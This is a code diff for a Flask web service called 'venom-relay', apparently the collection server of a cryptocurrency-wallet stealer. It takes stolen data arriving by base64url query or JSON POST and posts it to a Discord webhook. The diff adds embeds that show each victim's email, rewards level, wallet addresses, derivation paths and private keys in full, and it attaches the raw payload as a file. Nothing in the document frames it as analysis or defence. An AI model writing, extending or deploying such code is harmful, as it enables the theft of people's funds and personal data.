@@ -1,13 +1,19 @@
+# venom-relay — Render Web Service (Python / Flask)
+# env vars : DISCORD_WEBHOOK (obligatoire), SECRET (optionnel)
+# route    : GET /?data=<base64url>&key=<secret>  |  POST /  (json brut)
+
 import os
 import base64
 import json
 import time
+from datetime import datetime, timezone
 
 from dotenv import load_dotenv
-load_dotenv()  # charge .env s'il existe, ne fait rien sinon
+load_dotenv()
 
 from flask import Flask, request, Response
 import requests
+
 
 app = Flask(__name__)
 
@@ -16,6 +22,7 @@ SECRET  = os.environ.get("SECRET", "")
 
 if not WEBHOOK:
     raise SystemExit("DISCORD_WEBHOOK missing")
+
 DONE_PAGE = (
     "<!doctype html><meta charset=utf-8><title>ok</title>"
     "<body style='background:#050a06;color:#4ade80;font:14px system-ui;"
@@ -29,13 +36,67 @@ def decode_b64url(s: str) -> str:
     return base64.b64decode(b64).decode("utf-8")
 
 
-def forward(parsed: dict, payload: str) -> Response:
-    summary = (
-        f"**Venom** — platform: `{parsed.get('platform', '?')}`"
-        f" | keys: `{len(parsed.get('keys', []) or [])}`"
-        f" | host: `{parsed.get('host', '?')}`"
-    )
+def build_embeds(parsed: dict) -> list:
+    platform = parsed.get("platform", "?")
+    host = parsed.get("host", "?")
+    keys = parsed.get("keys", []) or []
+    wallets = parsed.get("wallets", []) or []
+    user = parsed.get("user") or {}
+    email = user.get("email") or "—"
+    rewards = user.get("rewardsLevel", "—")
 
+    overview = {
+        "title": f"Venom • {host}",
+        "color": 0x22C55E,
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "fields": [
+            {"name": "Platform", "value": f"`{platform}`", "inline": True},
+            {"name": "Keys",     "value": f"`{len(keys)}`", "inline": True},
+            {"name": "Wallets",  "value": f"`{len(wallets)}`", "inline": True},
+            {"name": "Email",    "value": f"`{email}`", "inline": True},
+            {"name": "Rewards",  "value": f"`{rewards}`", "inline": True},
+            {"name": "Host",     "value": f"`{host}`", "inline": True},
+        ],
+        "footer": {"text": "Venom Filters v2.7.0"},
+    }
+
+    embeds = [overview]
+
+    shown = wallets[:9]
+    for i, w in enumerate(shown):
+        if not isinstance(w, (list, tuple)) or len(w) < 2:
+            continue
+        addr  = w[0]
+        chain = (w[1] or "").upper()
+        label = w[5] if len(w) > 5 else ""
+        deriv = w[6] if len(w) > 6 else ""
+        key   = keys[i] if i < len(keys) else None
+
+        fields = [{"name": "Address", "value": f"```{addr}```", "inline": False}]
+        if deriv:
+            fields.append({"name": "Derivation", "value": f"`{deriv}`", "inline": True})
+        if label:
+            fields.append({"name": "Label", "value": f"`{label}`", "inline": True})
+        if key:
+            fields.append({"name": "Private Key", "value": f"```{key}```", "inline": False})
+
+        embeds.append({
+            "title": f"Wallet {i+1} — {chain or 'UNKNOWN'}",
+            "color": 0x16A34A,
+            "fields": fields,
+        })
+
+    if len(wallets) > 9:
+        overview["fields"].append({
+            "name": "Note",
+            "value": f"+{len(wallets)-9} wallets dans le fichier joint",
+            "inline": False,
+        })
+
+    return embeds
+
+
+def forward(parsed: dict, payload: str) -> Response:
     files = {
         "files[0]": (
             f"venom-{int(time.time()*1000)}.json",
@@ -43,7 +104,7 @@ def forward(parsed: dict, payload: str) -> Response:
             "application/json",
         )
     }
-    data = {"payload_json": json.dumps({"content": summary})}
+    data = {"payload_json": json.dumps({"embeds": build_embeds(parsed)})}
 
     try:
         r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
